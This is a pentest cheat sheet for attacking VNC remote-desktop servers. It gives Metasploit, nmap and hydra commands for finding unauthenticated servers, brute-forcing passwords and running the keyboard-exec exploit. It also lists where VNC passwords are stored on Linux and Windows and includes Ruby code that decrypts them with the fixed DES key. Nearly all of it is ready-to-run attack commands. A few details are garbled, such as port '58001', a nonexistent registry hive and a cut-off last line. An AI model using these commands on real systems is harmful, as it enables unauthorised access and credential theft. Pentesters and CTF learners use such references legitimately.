# Pentest VNC
# Default Port: 5800, 58001, 5900, 5901


# Enumeration - None Authentication Enabled (metasploit)
Detect VNC servers that support the 'None' authentication method.
use auxiliary/scanner/vnc/vnc_none_auth
run


# Connect to a VNC server
vncviewer <IP>:<PORT>

# Bruteforce (metasploit)
msf > use auxiliary/scanner/vnc/vnc_login

# Exploit (metasploit)
msf > use exploit/multi/vnc/vnc_keyboard_exec

# Enumeration (nmap)
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>

# Bruteforce (nmap)
nmap --script vnc-brute -p 5900

# Bruteforce (hydra)
;; vnc does not use usernames
hydra -P passwords.txt 192.168.2.62 vnc -vV -o report-vnc-hydra.txt
hydra -L <USERS_LIST> â€“P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV -o report-vnc-hydra.txt


# Enumerate VNC Passwords (Linux)
~/.vnc/passwd is the default location where the VNC password is
stored. The password is stored at this location when the vncserver starts
for a first time. To update or change your VNC password you should use
vncpasswd command.

    echo MYVNCPASSWORD | vncpasswd -f > ~/.secret/passvnc
    Warning: password truncated to the length of 8.

    cat ~/.secret/passvnc
    <garbage>

Now, if we have found the password file of the VNC on some CTF challenge
or vulnerable machine, we can either decrypt it (to know the password)
using VNC Password Decrypter or use the password file while using
vncviewer

    vncviewer hostname-of-vnc-server -passwd ~/.secret/passvnc

Where -passwd passwd-file File from which to get the password (as
generated by the vncpasswd(1) program). This option affects only the
standard VNC authentication.


# Enumerate VNC Passwords (Windows)

- RealVNC
    HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

- TightVNC
    HKEY_CURRENT_USER\Software\TightVNC\Server

- TigerVNC
    HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

- UltraVNC
    C:\Program Files\UltraVNC\ultravnc.ini


# Decrypt VNC Passwords
> msfconsole
> irb
> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
> require 'rex/proto/rfb'
> Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
> /dev/nul
